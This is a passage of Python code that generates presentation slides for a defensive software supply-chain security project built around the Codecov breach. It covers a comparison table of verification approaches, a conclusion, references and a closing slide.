    s = D.new("Innovation & Industry Relevance",
              "Compared with a checksum file or a bare signature, we add revocation, anti-replay, provenance, a "
              "defence even against a stolen key, automatic enforcement and tamper-evident evidence. This matches "
              "where the industry went after Codecov and SolarWinds: EO 14028, NIST SSDF, SLSA, Sigstore and TUF. "
              "It costs almost nothing to run: open-source libraries and milliseconds per verification.")
    rows = [["Capability", "Checksum file", "Signature only", "Our system"],
            ["Detects modified artifact", "Only if checked", "Yes", "Yes"],
            ["Survives registry compromise", "No", "Yes", "Yes"],
            ["Key rotation / revocation", "No", "Manual", "Yes: signed trust policy"],
            ["Blocks replay of old versions", "No", "No", "Yes: anti-rollback"],
            ["Build provenance", "No", "No", "Yes: signed"],
            ["Stolen-key defence", "No", "No", "Yes: MFA + scan + revoke"],
            ["Automatic CI enforcement", "No", "Often manual", "Yes: fail-closed gate"]]
    table(s, 0.4, 1.5, 9.2, [3.0, 1.8, 1.8, 2.6], rows, size=11.5, row_h=0.43, color_cols={1, 2, 3})
    for i, (h, d) in enumerate([("Industry alignment", "US EO 14028 · NIST SSDF (SP 800-218) · SLSA provenance · Sigstore · TUF / in-toto"),
                                ("Cost & feasibility", "Open-source (PyCA, OpenSSL, SQLite) · ~2 ms per check · cloud KMS key for production")]):
        x = 0.4 + i * 4.7
        box(s, x, 5.15, 4.5, 1.35, "FFFFFF")
        text(s, x + 0.12, 5.2, 4.3, 0.35, h, size=15, color=NAVY, bold=True)
        text(s, x + 0.12, 5.58, 4.3, 0.9, d, size=13.5)

    # ------------------------------------------------------------------ 14 conclusion
    s = D.new("Conclusion",
              "To conclude: the root cause of the Codecov damage was the absence of mandatory verification of both "
              "integrity and authenticity. Our prototype provides exactly that, automatically, and blocked every "
              "attack we simulated. The main limitation is a stolen key before revocation, which is why HSMs, MFA, "
              "monitoring and fast revocation matter. Future work: Sigstore, SLSA level 3, threshold signing.")
    box(s, 0.4, 1.5, 9.2, 1.25, GREEN_BG, "94C9A9")
    text(s, 0.55, 1.55, 8.9, 1.15, [
        ("LEGITIMATE SOFTWARE → VERIFIED → DEPLOYED", {"color": GREEN, "bold": True, "align": PP_ALIGN.CENTER, "size": 17}),
        ("TAMPERED SOFTWARE → DETECTED → BLOCKED", {"color": RED, "bold": True, "align": PP_ALIGN.CENTER, "size": 17}),
    ], font=HEAD, anchor=MSO_ANCHOR.MIDDLE, space_after=4)
    cols = [("Achieved", ["Integrity + authenticity verified on every download",
                          "Signing protected by RBAC + MFA (HSM/KMS concept)",
                          "Rotation, revocation, anti-replay via signed policy",
                          "Fail-closed gate + hash-chained audit log"]),
            ("Limitations", ["Stolen key valid until revoked",
                             "Proves who built it, not that source is benign",
                             "Software key store in prototype",
                             "Audit log not yet public"]),
            ("Future work", ["Sigstore keyless + Rekor log",
                             "SLSA L3 provenance, reproducible builds",
                             "2-of-3 threshold release signing",
                             "SBOM signing, cloud KMS backend"])]
    for i, (h, its) in enumerate(cols):
        x = 0.4 + i * 3.1
        box(s, x, 2.95, 2.95, 3.85, "FFFFFF")
        text(s, x + 0.12, 3.0, 2.7, 0.4, h, size=16, color=NAVY, bold=True)
        text(s, x + 0.12, 3.45, 2.75, 3.3, [(t, {"bullet": True}) for t in its], size=14, space_after=10)

    # ------------------------------------------------------------------ 15 references
    s = D.new("References (IEEE)", "Our main sources: Codecov's own post-mortem, press coverage, and the standards "
                                   "behind each primitive and practice we used.")
    refs = [
        '[1] Codecov, "Bash Uploader Security Update," Apr. 2021. https://about.codecov.io/security-update/',
        '[2] J. Menn and R. Satter, "Codecov hackers breached hundreds of restricted customer sites - sources," Reuters, Apr. 19, 2021.',
        '[3] HashiCorp, "HCSEC-2021-12 - Codecov Security Event and HashiCorp GPG Key Exposure," Apr. 2021.',
        '[4] NIST, "Secure Hash Standard (SHS)," FIPS 180-4, 2015.',
        '[5] S. Josefsson and I. Liusvaara, "Edwards-Curve Digital Signature Algorithm (EdDSA)," RFC 8032, 2017.',
        '[6] E. Rescorla, "The Transport Layer Security (TLS) Protocol Version 1.3," RFC 8446, 2018.',
        '[7] E. Barker, "Recommendation for Key Management," NIST SP 800-57 Pt. 1 Rev. 5, 2020.',
        '[8] M. Souppaya et al., "Secure Software Development Framework v1.1," NIST SP 800-218, 2022.',
        '[9] OpenSSF, "SLSA Specification v1.0," 2023. https://slsa.dev',
        '[10] Z. Newman, J. S. Meyers, S. Torres-Arias, "Sigstore: Software Signing for Everybody," ACM CCS, 2022.',
        '[11] J. Samuel et al., "Survivable Key Compromise in Software Update Systems," ACM CCS, 2010.',
        '[12] A. Shostack, Threat Modeling: Designing for Security, Wiley, 2014.',
    ]
    text(s, 0.45, 1.5, 9.1, 5.3, refs, size=12, space_after=5)

    # ------------------------------------------------------------------ 16 thank you
    s = D.new("", "Thank you. We are happy to take questions, or to run the live demo again.")
    text(s, 0.4, 2.3, 9.2, 1.0, "Thank You", size=44, color=NAVY, bold=True, font=HEAD, align=PP_ALIGN.CENTER)
    text(s, 0.4, 3.3, 9.2, 0.6, "Questions?", size=26, color=MUTED, font=HEAD, align=PP_ALIGN.CENTER)
    text(s, 0.4, 4.6, 9.2, 0.9, [("Prototype, tests and documentation: secure-supply-chain/", {"align": PP_ALIGN.CENTER}),
                                 ("python demo.py   ·   python -m pytest -v   ·   python -m attack_simulation.run_all",
                                  {"align": PP_ALIGN.CENTER, "font": "Courier New", "size": 12, "color": NAVY})],
         size=14, color=INK)
    return D.save()


if __name__ == "__main__":
    print(build())
